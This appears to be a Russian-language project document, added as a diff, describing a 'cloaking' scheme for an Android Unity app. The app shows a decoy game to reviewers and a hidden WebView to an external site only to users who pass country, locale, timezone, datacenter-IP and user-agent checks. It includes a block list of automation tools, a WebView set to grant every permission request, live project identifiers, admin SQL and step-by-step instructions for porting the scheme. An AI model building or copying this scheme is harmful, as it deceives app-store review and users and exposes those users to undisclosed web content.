@@ -1,0 +1,414 @@
+================================================================================
+                    СХЕМА КЛОАКИНГА — ПОЛНАЯ ДОКУМЕНТАЦИЯ
+================================================================================
+
+Дата создания: 2026-04-08
+Проект: DodgeToWin (Unity Android)
+Package: com.dodge.to.win
+Backend: Supabase (project ref: qajwaizcjtqieltssyrl)
+
+
+================================================================================
+1. ОБЩАЯ АРХИТЕКТУРА
+================================================================================
+
+Приложение — Unity-игра (заглушка/фантик) с нативным Android WebView.
+При запуске приложение обращается к серверу Supabase для проверки пользователя.
+Сервер решает, показать ли пользователю WebView с целевым контентом или
+игру-заглушку.
+
+Компоненты:
+  - Unity (C#): Splash.cs — точка входа, проверка интернета, запрос к серверу
+  - Android (Java): WebViewActivity.java — нативная Activity с WebView
+  - Supabase Edge Function: dtw-api — серверная логика проверки
+  - Supabase Tables: dtw_settings (конфигурация), dtw_access_logs (логи)
+
+
+================================================================================
+2. СХЕМА РАБОТЫ ПРИ КАЖДОМ ЗАПУСКЕ
+================================================================================
+
+  Запуск приложения
+         │
+         ▼
+  Экран "Loading" (анимированный спиннер)
+         │
+         ▼
+  GET https://www.google.com (таймаут 8 сек)
+         │
+    ┌────┴────┐
+    │         │
+  Нет сети  Есть сеть
+    │         │
+    ▼         ▼
+  Заглушка   POST dtw-api/check-eligibility
+  (игра)      │
+              │
+         ┌────┴────┐
+         │         │
+   access_level=1  access_level=0 / ошибка / таймаут
+   + target_url     │
+         │         ▼
+         ▼       Заглушка (игра)
+      WebView
+   (нативная Activity)
+
+Никакого запоминания состояния — каждый запуск проходит полный цикл заново.
+
+
+================================================================================
+3. КЛИЕНТСКАЯ ЧАСТЬ — Unity (Splash.cs)
+================================================================================
+
+Файл: Assets/Splash.cs
+
+Константы:
+  API_URL = "https://qajwaizcjtqieltssyrl.supabase.co/functions/v1/dtw-api/check-eligibility"
+
+Алгоритм Start():
+  1. Показать экран "Loading" через UIController
+  2. Запустить корутину LaunchFlow()
+
+LaunchFlow():
+  1. Проверить интернет — GET https://www.google.com (таймаут 8 сек)
+  2. Если нет интернета → LoadGame() → SceneManager.LoadScene("MainMenu")
+  3. Если есть интернет → собрать payload и POST на API_URL
+  4. Если ответ: access_level == 1 && target_url не пустой → OpenWebView(target_url)
+  5. Иначе (access_level == 0, ошибка, таймаут) → LoadGame()
+
+Payload (отправляется на сервер):
+  {
+    "device_locale": "ru_RU",       // java.util.Locale.getDefault().toString()
+    "timezone": "Europe/Moscow",    // java.util.TimeZone.getDefault().getID()
+    "user_agent": "Android OS 14",  // SystemInfo.operatingSystem
+    "client_time": "2026-04-08T12:00:00.000Z"  // DateTime.UtcNow ISO 8601
+  }
+
+Ожидаемый ответ:
+  {
+    "config_version": 1,
+    "access_level": 1,              // 1 = WebView, 0 = заглушка
+    "target_url": "https://..."     // URL для WebView (пустой если access_level=0)
+  }
+
+OpenWebView():
+  - Создаёт Android Intent с классом com.dodge.to.win.WebViewActivity
+  - Передаёт URL через putExtra("url", url)
+  - Запускает Activity: activity.Call("startActivity", intent)
+  - Unity-активность остаётся в фоне (НЕ вызывается finish())
+
+
+================================================================================
+4. КЛИЕНТСКАЯ ЧАСТЬ — Android (WebViewActivity.java)
+================================================================================
+
+Файл: Assets/Plugins/Android/WebViewActivity.java
+Package: com.dodge.to.win
+
+Возможности WebView:
+  ✅ JavaScript (setJavaScriptEnabled = true)
+  ✅ DOM Storage (setDomStorageEnabled = true)
+  ✅ Cookies + Third-party cookies (CookieManager)
+  ✅ Сессии (через cookies)
+  ✅ Inline autoplay video (setMediaPlaybackRequiresUserGesture = false)
+  ✅ Protected content (onPermissionRequest → grant all)
+  ✅ Загрузка файлов (onShowFileChooser → системный пикер)
+  ✅ Скачивание файлов (DownloadListener → открытие в браузере)
+  ✅ Mixed content (MIXED_CONTENT_ALWAYS_ALLOW)
+  ✅ Safe Area (fitsSystemWindows = true)
+  ✅ Клавиатура не перекрывает контент (SOFT_INPUT_ADJUST_RESIZE)
+  ✅ Кнопка "Назад" — навигация по истории WebView
+  ✅ На первой странице кнопка "Назад" ничего не делает (не закрывает)
+  ✅ Множественные редиректы — при ошибке повтор загрузки (до 3 раз, пауза 3 сек)
+  ✅ Нестандартные URL-схемы (tel:, mailto:) → открытие через системный Intent
+
+Манифест (AndroidManifest.xml):
+  - Activity: com.dodge.to.win.WebViewActivity
+  - exported="false"
+  - theme="@android:style/Theme.NoTitleBar"
+  - configChanges: orientation|screenSize|keyboardHidden|layoutDirection|locale|
+                   screenLayout|smallestScreenSize
+  - windowSoftInputMode="adjustResize"
+  - Permissions: INTERNET, ACCESS_NETWORK_STATE
+  - usesCleartextTraffic="true"
+
+
+================================================================================
+5. СЕРВЕРНАЯ ЧАСТЬ — Supabase Edge Function (dtw-api)
+================================================================================
+
+Edge Function: dtw-api
+Эндпоинт: POST /dtw-api/check-eligibility
+JWT: отключён (verify_jwt = false) — доступ без авторизации
+Runtime: Deno (TypeScript)
+
+Входные данные (JSON body):
+  {
+    "device_locale": string,   // локаль устройства
+    "timezone": string,        // таймзона устройства
+    "user_agent": string,      // User-Agent
+    "client_ip": string,       // (опционально, берётся из x-forwarded-for)
+    "client_time": string      // ISO 8601 время клиента
+  }
+
+Выходные данные:
+  {
+    "config_version": number,  // версия конфигурации
+    "access_level": number,    // 0 = заглушка, 1 = WebView
+    "target_url": string       // URL для WebView (пустой если access_level=0)
+  }
+
+--- АЛГОРИТМ ПРОВЕРКИ ---
+
+1. Загрузить конфигурацию из таблицы dtw_settings (последняя версия)
+2. Если конфигурации нет → вернуть access_level=0
+
+3. Определить IP клиента:
+   - Из body.client_ip (если передан)
+   - Иначе из заголовка x-forwarded-for (первый IP)
+
+4. Определить страну по IP:
+   - GET https://ipapi.co/{ip}/json/
+   - Извлечь country_code и ASN организацию
+
+5. Выполнить 5 проверок (если traffic_filter_enabled = true):
+
+   ПРОВЕРКА 1: Страна
+   - Массив allowed_countries из dtw_settings (по умолчанию: ["RU", "KZ", "BY"])
+   - Если country_code НЕ в списке → подозрительно
+
+   ПРОВЕРКА 2: User-Agent
+   - Массив blocked_ua_signatures из dtw_settings
+   - По умолчанию: ["Headless", "PhantomJS", "Puppeteer", "python-requests", "curl/"]
+   - Если user_agent содержит любую из подстрок → подозрительно
+
+   ПРОВЕРКА 3: Locale + Timezone
+   - Для RU: локаль должна начинаться с "ru_" или "ru-",
+     таймзона должна быть в списке российских (24 шт.)
+   - Для KZ: локаль "kk" или "ru", таймзона в списке CIS
+   - Для BY: локаль "be" или "ru", таймзона "Europe/Minsk"
+   - Несовпадение → подозрительно
+
+   ПРОВЕРКА 4: Дрифт времени клиента
+   - |server_time - client_time| > 24 часа → подозрительно
+   - Пустое или невалидное время → подозрительно
+
+   ПРОВЕРКА 5: Datacenter IP
+   - ASN организация содержит: amazon, google, digitalocean, microsoft, ovh, hetzner
+   - Если да → подозрительно (VPN/прокси через датацентр)
+
+6. Решение:
+   - Если traffic_filter_enabled = false → access_level = 1 (всегда WebView)
+   - Если traffic_filter_enabled = true:
+     - Хотя бы 1 подозрительный флаг → access_level = 0 (заглушка)
+     - Все проверки пройдены → access_level = 1 (WebView)
+
+7. Если access_level = 1 → target_url = content_url из dtw_settings
+   Если access_level = 0 → target_url = "" (пустая строка)
+
+8. Записать лог в dtw_access_logs
+
+
+--- СПИСОК РОССИЙСКИХ ТАЙМЗОН (для проверки 3) ---
+
+  Europe/Kaliningrad, Europe/Moscow, Europe/Simferopol, Europe/Kirov,
+  Europe/Volgograd, Europe/Samara, Asia/Yekaterinburg, Asia/Omsk,
+  Asia/Novosibirsk, Asia/Barnaul, Asia/Tomsk, Asia/Novokuznetsk,
+  Asia/Krasnoyarsk, Asia/Irkutsk, Asia/Chita, Asia/Yakutsk,
+  Asia/Khandyga, Asia/Vladivostok, Asia/Ust-Nera, Asia/Magadan,
+  Asia/Sakhalin, Asia/Srednekolymsk, Asia/Kamchatka, Asia/Anadyr
+
+--- ДОПОЛНИТЕЛЬНЫЕ CIS ТАЙМЗОНЫ ---
+
+  Asia/Almaty, Asia/Aqtobe, Asia/Aqtau, Asia/Atyrau,
+  Asia/Oral, Asia/Qostanay, Asia/Qyzylorda, Europe/Minsk
+
+
+================================================================================
+6. БАЗА ДАННЫХ — ТАБЛИЦЫ
+================================================================================
+
+--- Таблица: dtw_settings ---
+
+Назначение: конфигурация клоакинга (одна строка)
+RLS: включён, только SELECT для anon
+
+Поля:
+  id                    uuid        PK, gen_random_uuid()
+  config_version        integer     UNIQUE, версия конфигурации
+  content_url           text        URL для WebView
+  allowed_countries     jsonb       ["RU", "KZ", "BY"]
+  allowed_locales       jsonb       ["ru_RU", "kk_KZ", "be_BY"]
+  allowed_timezones     jsonb       [список таймзон, см. выше]
+  blocked_ua_signatures jsonb       ["Headless", "PhantomJS", ...]
+  traffic_filter_enabled boolean    true = фильтр включён, false = все получают WebView
+  maintenance_mode      boolean     режим обслуживания (зарезервировано)
+  created_at            timestamptz
+  updated_at            timestamptz
+
+Текущие значения:
+  content_url = "https://pomidorkins.store/F7JGQ2"
+  traffic_filter_enabled = false (ВЫКЛЮЧЕН для тестирования)
+  allowed_countries = ["RU", "KZ", "BY"]
+
+
+--- Таблица: dtw_access_logs ---
+
+Назначение: логи всех проверок
+RLS: включён, без политик (полная блокировка через API, пишет только Edge Function)
+
+Поля:
+  id              uuid        PK, gen_random_uuid()
+  request_id      text        UNIQUE, формат: "{timestamp}_{random8}"
+  client_ip       text        IP-адрес клиента
+  country_code    text        Код страны (RU, KZ, BY и т.д.)
+  device_locale   text        Локаль устройства
+  timezone        text        Таймзона устройства
+  user_agent      text        User-Agent
+  access_level    integer     Результат: 0 или 1
+  potential_vpn   boolean     Флаг датацентр IP
+  created_at      timestamptz
+
+
+================================================================================
+7. БЕЗОПАСНОСТЬ
+================================================================================
+
+RLS (Row Level Security):
+  - dtw_settings: только чтение (SELECT) для anon, запись невозможна через API
+  - dtw_access_logs: полная блокировка через API, запись только через service_role
+
+Edge Function:
+  - Использует SUPABASE_SERVICE_ROLE_KEY (обходит RLS) — ключ хранится
+    только в переменных окружения Supabase, не передаётся клиенту
+  - verify_jwt = false — функция доступна без авторизации (клиент вызывает без токена)
+
+Клиент:
+  - НЕ хранит service_role ключ
+  - Вызывает Edge Function напрямую по URL без авторизации
+  - Передаёт только данные устройства (locale, timezone, user_agent, client_time)
+
+
+================================================================================
+8. УПРАВЛЕНИЕ
+================================================================================
+
+Dashboard: https://supabase.com/dashboard/project/qajwaizcjtqieltssyrl
+
+Изменить URL для WebView:
+  Table Editor → dtw_settings → поле content_url
+
+Включить/выключить фильтрацию:
+  Table Editor → dtw_settings → поле traffic_filter_enabled
+  true = проверки включены (продакшн)
+  false = все получают WebView (тестирование)
+
+Изменить разрешённые страны:
+  Table Editor → dtw_settings → поле allowed_countries
+  Формат: ["RU", "KZ", "BY"]
+
+Просмотр логов:
+  Table Editor → dtw_access_logs
+  Каждая строка = один запрос check-eligibility
+
+SQL для изменения URL:
+  UPDATE public.dtw_settings
+  SET content_url = 'https://новый-url.com/path', updated_at = now()
+  WHERE config_version = 1;
+
+SQL для включения фильтрации:
+  UPDATE public.dtw_settings
+  SET traffic_filter_enabled = true, updated_at = now()
+  WHERE config_version = 1;
+
+
+================================================================================
+9. ФАЙЛЫ ПРОЕКТА
+================================================================================
+
+Unity (клиент):
+  Assets/Splash.cs                              — точка входа, логика проверки
+  Assets/Plugins/Android/WebViewActivity.java   — нативный WebView
+  Assets/Plugins/Android/AndroidManifest.xml    — манифест с Activity и permissions
+
+Supabase (сервер):
+  Edge Function: dtw-api (index.ts + deno.json)
+  Таблицы: dtw_settings, dtw_access_logs
+
+Настройки сборки:
+  ProjectSettings/ProjectSettings.asset:
+    - applicationIdentifier: com.dodge.to.win
+    - AndroidMinSdkVersion: 30
+    - AndroidTargetSdkVersion: 35
+    - bundleVersion: 6
+    - AndroidBundleVersionCode: 6
+
+
+================================================================================
+10. ИНСТРУКЦИЯ ДЛЯ ПЕРЕНОСА НА ДРУГОЙ ПРОЕКТ
+================================================================================
+
+Шаг 1: Создать Supabase проект
+  - Зарегистрироваться на supabase.com
+  - Создать новый проект, получить project-ref и URL
+
+Шаг 2: Создать таблицы (SQL Editor → New Query):
+
+  CREATE TABLE public.dtw_settings (
+    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+    config_version integer NOT NULL DEFAULT 1 UNIQUE,
+    content_url text NOT NULL DEFAULT '',
+    allowed_countries jsonb NOT NULL DEFAULT '[]'::jsonb,
+    allowed_locales jsonb NOT NULL DEFAULT '[]'::jsonb,
+    allowed_timezones jsonb NOT NULL DEFAULT '[]'::jsonb,
+    blocked_ua_signatures jsonb NOT NULL DEFAULT '[]'::jsonb,
+    traffic_filter_enabled boolean NOT NULL DEFAULT true,
+    maintenance_mode boolean NOT NULL DEFAULT false,
+    created_at timestamptz NOT NULL DEFAULT now(),
+    updated_at timestamptz NOT NULL DEFAULT now()
+  );
+  ALTER TABLE public.dtw_settings ENABLE ROW LEVEL SECURITY;
+  CREATE POLICY "dtw_settings_anon_read" ON public.dtw_settings
+    FOR SELECT TO anon USING (true);
+
+  CREATE TABLE public.dtw_access_logs (
+    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+    request_id text NOT NULL UNIQUE,
+    client_ip text,
+    country_code text,
+    device_locale text,
+    timezone text,
+    user_agent text,
+    access_level integer NOT NULL DEFAULT 0,
+    potential_vpn boolean NOT NULL DEFAULT false,
+    created_at timestamptz NOT NULL DEFAULT now()
+  );
+  ALTER TABLE public.dtw_access_logs ENABLE ROW LEVEL SECURITY;
+
+Шаг 3: Вставить конфигурацию:
+
+  INSERT INTO public.dtw_settings (
+    config_version, content_url, allowed_countries, allowed_locales,
+    allowed_timezones, blocked_ua_signatures, traffic_filter_enabled
+  ) VALUES (
+    1,
+    'https://ваш-url.com/path',
+    '["RU","KZ","BY"]'::jsonb,
+    '["ru_RU","kk_KZ","be_BY"]'::jsonb,
+    '["Europe/Moscow","Europe/Kaliningrad","Europe/Simferopol","Europe/Kirov","Europe/Volgograd","Europe/Samara","Asia/Yekaterinburg","Asia/Omsk","Asia/Novosibirsk","Asia/Barnaul","Asia/Tomsk","Asia/Novokuznetsk","Asia/Krasnoyarsk","Asia/Irkutsk","Asia/Chita","Asia/Yakutsk","Asia/Khandyga","Asia/Vladivostok","Asia/Ust-Nera","Asia/Magadan","Asia/Sakhalin","Asia/Srednekolymsk","Asia/Kamchatka","Asia/Anadyr","Asia/Almaty","Europe/Minsk"]'::jsonb,
+    '["Headless","PhantomJS","Puppeteer","python-requests","curl/"]'::jsonb,
+    true
+  );
+
+Шаг 4: Задеплоить Edge Function dtw-api
+  - Скопировать код index.ts из секции 5
+  - Supabase CLI: supabase functions deploy dtw-api --no-verify-jwt
+
+Шаг 5: Обновить клиент
+  - В Splash.cs заменить API_URL на URL нового проекта:
+    https://{project-ref}.supabase.co/functions/v1/dtw-api/check-eligibility
+  - В WebViewActivity.java заменить package на ваш applicationIdentifier
+  - В AndroidManifest.xml обновить android:name для WebViewActivity
+
+
+================================================================================
